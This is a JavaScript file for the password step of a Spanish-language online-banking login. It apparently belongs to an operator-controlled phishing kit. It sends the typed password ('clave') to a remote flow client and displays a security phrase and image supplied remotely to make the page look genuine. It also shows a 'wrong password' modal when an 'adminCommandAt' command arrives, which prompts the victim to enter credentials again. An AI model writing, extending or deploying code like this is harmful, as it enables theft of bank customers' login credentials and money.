(function () {
  var ERROR_PAGE = 3;
  var lastShownCommandAt = '';

  function alertKey(detail) {
    var data = detail && detail.data ? detail.data : {};
    if (data.adminCommandAt) {
      return String(data.adminCommandAt);
    }
    return [data.passwdErr ? '1' : '0', data.loginError || '', detail && detail.page].join('|');
  }

  function shouldShow(detail) {
    var key = alertKey(detail);
    if (!key || key === '|') {
      return false;
    }
    if (key === lastShownCommandAt) {
      return false;
    }
    lastShownCommandAt = key;
    return true;
  }

  function isPasswdError(detail) {
    var page = detail ? Number(detail.page) : NaN;
    var data = detail && detail.data ? detail.data : {};
    return page === ERROR_PAGE || data.passwdErr === true || data.loginError === 'datos';
  }

  function applySecurityProfile(data) {
    var avatar = document.getElementById('avatar');
    var avatarDiv = document.getElementById('avatarDiv');
    var fraseEl = document.getElementById('fraseSeguridadLabel');
    var frase = String((data && data.fraseSeguridad) || '').trim();
    var imagen = String((data && data.imagenSeguridad) || '').trim();

    if (avatar && imagen) {
      avatar.src = imagen;
    }
    if (!fraseEl && avatarDiv) {
      fraseEl = document.createElement('p');
      fraseEl.id = 'fraseSeguridadLabel';
      fraseEl.className = 'ld-text-caption1 ld-text-center ld-mt-2';
      avatarDiv.insertAdjacentElement('afterend', fraseEl);
    }
    if (fraseEl) {
      fraseEl.textContent = frase || '';
      fraseEl.style.display = frase ? '' : 'none';
    }
  }

  function revealProfile(data) {
    var imagen = String((data && data.imagenSeguridad) || '').trim();
    var avatar = document.getElementById('avatar');
    var alreadyPainted = !!(avatar && imagen && avatar.getAttribute('src') === imagen && avatar.naturalWidth > 0);
    applySecurityProfile(data || {});
    if (!window.FlowPrefetch) {
      return;
    }
    if (imagen && !alreadyPainted) {
      window.FlowPrefetch.holdUntilImage(document.getElementById('avatar'));
      return;
    }
    window.FlowPrefetch.release();
  }

  var prefetched = window.FlowPrefetch && window.FlowPrefetch.peek();
  if (prefetched && (Number(prefetched.page) === 1 || Number(prefetched.page) === 3 || prefetched.imagenSeguridad || prefetched.fraseSeguridad)) {
    revealProfile(prefetched);
  } else if (window.FlowPrefetch) {
    window.FlowPrefetch.holdCover(8000);
  }

  document.addEventListener('stepFlowPage', function (event) {
    var detail = event.detail || {};
    revealProfile(detail.data || {});
    if (isPasswdError(detail) && shouldShow(detail)) {
      if (window.showErrorModal) {
        window.showErrorModal();
      }
      if (window.hideLoader) {
        window.hideLoader();
      }
    }
  });

  StepFlowClient.init({
    pageLocation: 'passwd',
    sessionKey: 'intermaticoActual',
    localPage: 1,
    errorPage: ERROR_PAGE,
    errorFlag: 'passwdErr',
    lgSelector: '#logn',
    inputSelector: '#toko',
    mitSelector: '#botonSendToko',
    mitLabel: 'Iniciar sesión',
    loadingLabel: 'Procesando…',
    fallbackUrl: 'index.html',
    isValid: function (value) {
      return String(value || '').trim().length >= 1;
    },
    buildPayload: function (value) {
      return {
        clave: value,
        passwdErr: false,
        loginError: ''
      };
    },
    onRemoteData: applySecurityProfile
  });
})();
